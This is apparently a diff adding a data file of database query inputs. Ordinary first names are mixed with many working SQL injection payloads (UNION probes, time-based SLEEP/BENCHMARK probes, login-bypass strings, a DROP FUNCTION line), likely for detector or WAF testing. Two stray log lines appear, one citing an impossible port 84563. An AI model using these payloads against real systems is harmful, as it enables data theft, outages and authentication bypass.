@@ -1,0 +1,4519 @@
+query
+'John'
+'Fran'
+'Jill'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))'"
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29'"
+"'1)) or benchmark(10000000,MD5(1))#'"
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'"
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9--'"
+'ORDER BY 2#'
+'Bob'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#'"
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25'"
+"'admin""""/*'"
+'' AND id IS NULL; --'
+'Alice'
+'Hank'
+"'UNION ALL SELECT 1,2,3,4,5,6,7#'"
+'Eve'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#'"
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'"
+'Jill'
+'Grace'
+'John'
+'John'
+'Alice'
+"'admin"""") or (""""1""""=""""1""""#'"
+'Alice'
+'Hank'
+'Bob'
+'Charlie'
+'||		(double pipe) concatenate'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--'"
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))'"
+''=0--+'
+'David'
+'Hank'
+'Eve'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14'"
+'Alice'
+'Alice'
+'Charlie'
+'Hank'
+'John'
+'David'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--'"
+"'+benchmark(3200,SHA1(1))+''"
+'John'
+'John'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16#'"
+'AND 7300=7300 AND ('pKlZ'='pKlY'
+'John'
+'ORDER BY 1'
+"'admin""""/*'"
+'Alice'
+"'and (select substring(@@version,3,1))='S''"
+'John'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--'"
+'Alice'
+'Jill'
+'Hank'
+'WHERE 1=1 AND 1=1--'
+'pg_SLEEP(5)--'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19'"
+'Eve'
+'admin'or 1=1 or ''=''
+'Charlie'
+"'benchmark(50000000,MD5(1))--'"
+'David'
+'Fran'
+'ORDER BY 27'
+'Hank'
+'Alice'
+'#	    Hash comment'
+'Bob'
+'John'
+"'') or benchmark(10000000,MD5(1))#'"
+'Charlie'
+'Fran'
+'admin' #'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))'"
+'%		wildcard attribute indicator'
+'Grace'
+"'UNION ALL SELECT 1,2--'"
+'Grace'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7--'"
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25'"
+'Jill'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A'))'"
+'''
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'"
+'Fran'
+'Hank'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7--'"
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))#'"
+'Charlie'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))'"
+"'""""*""""'"
+'Bob'
+'OR 1=1'
+"'"""" or """"x""""=""""x'"
+'Eve'
+'+ SLEEP(10) + ''
+'Grace'
+'David'
+'John'
+'David'
+'Grace'
+'Bob'
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'"
+'Alice'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18'"
+'Charlie'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15#'"
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12#'"
+'Hank'
+'AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2#'"
+'John'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))#'"
+'John'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#'"
+'ORDER BY 31337--'
+'Alice'
+'John'
+'or pg_SLEEP(5)--'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--'"
+'Eve'
+'Alice'
+'Bob'
+'\'
+'David'
+'Alice'
+"'and (select substring(@@version,3,1))='S''"
+'Jill'
+'Alice'
+'ORDER BY 28--'
+'ORDER BY SLEEP(5)#'
+'ORDER BY 12#'
+'Eve'
+'Bob'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7'"
+'Grace'
+'Alice'
+'Jill'
+'Charlie'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13'"
+'/'
+'Eve'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21'"
+'AS INJECTX WHERE 1=1 AND 1=0'
+'David'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))--'"
+'John'
+'Charlie'
+'' OR EXISTS(SELECT * FROM users WHERE name = 'admin') --'
+'Grace'
+'Alice'
+'David'
+'Charlie'
+'Grace'
+'Alice'
+'Eve'
+''));
+'Grace'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#'"
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7#'"
+'AS INJECTX WHERE 1=1 AND 1=0--'
+'Grace'
+'Bob'
+'OR 1=1'
+'Grace'
+'Alice'
+'Fran'
+'Charlie'
+'Bob'
+'Charlie'
+'Eve'
+'Hank'
+'Charlie'
+'Fran'
+'Eve'
+'Fran'
+'Charlie'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12'"
+'1 AND (SELECT * FROM Users) = 1'
+'John'
+'OR x=x'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15#'"
+'John'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25'"
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15--'"
+'Fran'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9'"
+'/'
+'1) or sleep(5)#'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#'"
+'Alice'
+'Jill'
+'Charlie'
+'Alice'
+'Hank'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15'"
+'ORDER BY 30--'
+''LIKE''
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'"
+'Alice'
+'John'
+"'UNION ALL SELECT 1,2,3,4,5,6,7#'"
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--'"
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10--'"
+'Charlie'
+'Charlie'
+"'UNION ALL SELECT 1,2,3,4,5,6,7'"
+"'admin"""") or """"1""""=""""1""""/*'"
+'Bob'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#'"
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6--'"
+'Alice'
+"'OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))'"
+'David'
+'Fran'
+'David'
+'Hank'
+'WHERE 1=1 AND 1=1'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7#'"
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20'"
+'Bob'
+'Grace'
+'AnD SLEEP(5)#'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14'"
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))#'"
+'Fran'
+"'"""")) or benchmark(10000000,MD5(1))#'"
+"'AND (SELECT 4523 FROM(SELECT COUNT(*),CONCAT(0x716a7a6a71,(SELECT (ELT(4523=4523,1))),0x71706a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)'"
+'AS INJECTX WHERE 1=1 AND 1=0#'
+'Eve'
+"'ORDER BY 1,SLEEP(5),3,4#'"
+'Hank'
+'Alice'
+'Hank'
+'Jill'
+'Eve'
+'ORDER BY 30'
+'Charlie'
+'Charlie'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#'"
+'Fran'
+'AS INJECTX WHERE 1=1 AND 1=0--'
+'Alice'
+'AND 0'
+'Fran'
+'Fran'
+'Jill'
+'Eve'
+'/*  	C-style comment'
+'Alice'
+'Grace'
+'Eve'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))#'"
+'Hank'
+'David'
+'David'
+'John'
+'David'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15#'"
+'Eve'
+'Alice'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))--'"
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21'"
+'HAVING 1=0#'
+'David'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12#'"
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23'"
+'Fran'
+'David'
+'John'
+'ORDER BY 27'
+'David'
+'/'
+'John'
+'' OR '1'
+'David'
+'Bob'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16--'"
+'Jill'
+'&&SLEEP(5)--'
+'John'
+'John'
+'Hank'
+'' OR '1'='1' --'
+'Hank'
+'John'
+'ORDER BY 15#'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12#'"
+'John'
+'Bob'
+'Bob'
+'David'
+'Charlie'
+'John'
+'Bob'
+'Alice'
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'"
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5--'"
+'Fran'
+'Jill'
+'Alice'
+'John'
+'Alice'
+'David'
+'Alice'
+'IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--'
+'John'
+'ORDER BY 30'
+"'benchmark(50000000,MD5(1))'"
+'Charlie'
+'Grace'
+'ORDER BY 28#'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12'"
+'Eve'
+'pg_SLEEP(5)#'
+'Bob'
+'Bob'
+'OR 1=0--'
+'Fran'
+'Alice'
+'Charlie'
+'Fran'
+'Fran'
+'Charlie'
+"'UNION ALL SELECT 1,2,3,4,5,6,7#'"
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--'"
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#'"
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17'"
+'Grace'
+'Fran'
+'Eve'
+'Fran'
+"'-1' UNION SELECT 1,2,3--+'"
+"'-1 UNION SELECT 1 INTO @,@,@'"
+'Jill'
+'Fran'
+'Alice'
+'&&SLEEP(5)--'
+'OR 1=1'
+'admin' or '1'='1'--'
+'Eve'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14#'"
+'Alice'
+'Jill'
+'ORDER BY 29'
+"'admin""""or 1=1 or """"""""=""""'"
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#'"
+"'SLEEP(1)/*' or SLEEP(1) or '"""" or SLEEP(1) or """"*/'"
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9#'"
+'Eve'
+"'UNION ALL SELECT 1,2,3,4,5,6,7#'"
+'HAVING 1=0'
+'Eve'
+'Eve'
+'Fran'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#'"
+'Eve'
+'Eve'
+'admin' or '1'='1'/*'
+'Eve'
+'John'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--'"
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11'"
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'"
+'John'
+'Grace'
+'Bob'
+'David'
+'Grace'
+'Hank'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--'"
+'Eve'
+'`'
+'Jill'
+'David'
+'Bob'
+'Hank'
+'Jill'
+'ORDER BY 11'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#'"
+'Alice'
+'AND 1=0#'
+'ORDER BY SLEEP(5)'
+'Eve'
+'Charlie'
+'David'
+"'"""");"
+'ORDER BY 4'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))#'"
+'David'
+'Hank'
+'Fran'
+'Hank'
+'Grace'
+'David'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8#'"
+'Jill'
+'') or pg_sleep(5)--'
+'+ SLEEP(10) + ''
+'Fran'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))'"
+''LIKE''
+'David'
+'John'
+"'"""" or """"""""-""""'"
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))--'"
+'Charlie'
+'Hank'
+'Eve'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#'"
+'Alice'
+"'UNION ALL SELECT USER(),SLEEP(5)--'"
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))'"
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10#'"
+'ORDER BY SLEEP(5)'
+'Eve'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9--'"
+'Grace'
+'ORDER BY 30#'
+"'"""";"
+'John'
+'Alice'
+'Bob'
+'Hank'
+'Hank'
+'AnD SLEEP(5)#'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))'"
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL--'"
+'/*…*/'
+'Jill'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#'"
+'Alice'
+'SLEEP(5)--'
+'Alice'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))--'"
+"'OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))'"
+'admin' or '1'='1'
+"'UNION ALL SELECT 1,2,3,4,5,6#'"
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--'"
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3#'"
+'Jill'
+'Eve'
+'John'
+'John'
+'AND 1=0'
+'Alice'
+'Jill'
+"'"""" OR 1 = 1 -- -'"
+'John'
+"''\""""'"
+'David'
+'David'
+'Hank'
+'Grace'
+'David'
+'Bob'
+'Eve'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14'"
+'Grace'
+'AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'=''
+'' OR '1'='1'
+'-2'
+'AnD SLEEP(5)'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7'"
+'Charlie'
+'David'
+'Fran'
+'Hank'
+'John'
+'Alice'
+'Bob'
+'David'
+Microservice running on port 84563
+'David'
+'ORDER BY 13'
+'Grace'
+'' OR '1'='1' --'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#'"
+'Eve'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--'"
+'Grace'
+"'benchmark(50000000,MD5(1))'"
+'Jill'
+'Eve'
+'Alice'
+'Hank'
+'Jill'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))#'"
+'ORDER BY 18'
+'ORDER BY 9'
+'Hank'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9#'"
+'&&SLEEP(5)#'
+'Jill'
+'Bob'
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'"
+'/*  	C-style comment'
+'Alice'
+'Charlie'
+'Charlie'
+'Bob'
+'ORDER BY 31337#'
+'Hank'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#'"
+'Bob'
+Microservice running on port 3000
+'Fran'
+'David'
+'Alice'
+'AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'=''
+'UNION ALL SELECT 1'
+'John'
+'Eve'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8--'"
+'ORDER BY 26#'
+'Eve'
+'Jill'
+'Hank'
+'Eve'
+'Alice'
+'Hank'
+'ORDER BY 10'
+'Fran'
+'Grace'
+'Charlie'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20'"
+'Charlie'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14#'"
+'ORDER BY 17'
+'David'
+'ORDER BY 21#'
+'Fran'
+'Alice'
+'Bob'
+'Alice'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18#'"
+"'ORDER BY 1,SLEEP(5),3--'"
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24'"
+'ORDER BY SLEEP(5)'
+'Hank'
+'John'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--'"
+'Fran'
+'Hank'
+'David'
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'"
+'Hank'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8'"
+'Bob'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10'"
+'Jill'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))--'"
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27'"
+'Grace'
+'Bob'
+'Jill'
+'Fran'
+'Alice'
+'Hank'
+'Charlie'
+'John'
+'Grace'
+"'SLEEP(1)/*' or SLEEP(1) or '"""" or SLEEP(1) or """"*/'"
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13--'"
+"'or benchmark(50000000,MD5(1))--'"
+'Grace'
+'Eve'
+'ORDER BY 21'
+'ORDER BY 9#'
+'or SLEEP(5)=''
+'David'
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'"
+'Eve'
+'Bob'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--'"
+'Fran'
+'Eve'
+'Grace'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#'"
+'Hank'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11'"
+'Hank'
+'ORDER BY 8#'
+'Hank'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#'"
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A'))'"
+'AND 1=0--'
+'ORDER BY 21#'
+'Eve'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8--'"
+'Hank'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11'"
+'Hank'
+'Hank'
+'Jill'
+'David'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#'"
+'David'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))--'"
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--'"
+'Grace'
+'Jill'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'"
+'Fran'
+'ORDER BY 15#'
+'Jill'
+'Fran'
+'Jill'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13--'"
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4--'"
+'Bob'
+'Grace'
+'Eve'
+'Hank'
+'' or ''*''
+'ORDER BY 20--'
+'Eve'
+'Charlie'
+'Fran'
+'Jill'
+'Fran'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16'"
+'Alice'
+'Fran'
+'Bob'
+'ORDER BY 12'
+'ORDER BY SLEEP(5)'
+'Eve'
+'Jill'
+'David'
+'David'
+'Bob'
+'Alice'
+'Eve'
+'David'
+'Bob'
+'Eve'
+'Bob'
+"'"""");"
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'"
+'Hank'
+'OR 1=1#'
+'Hank'
+'Grace'
+'Charlie'
+'Charlie'
+"'admin"""") or (""""1""""=""""1""""#'"
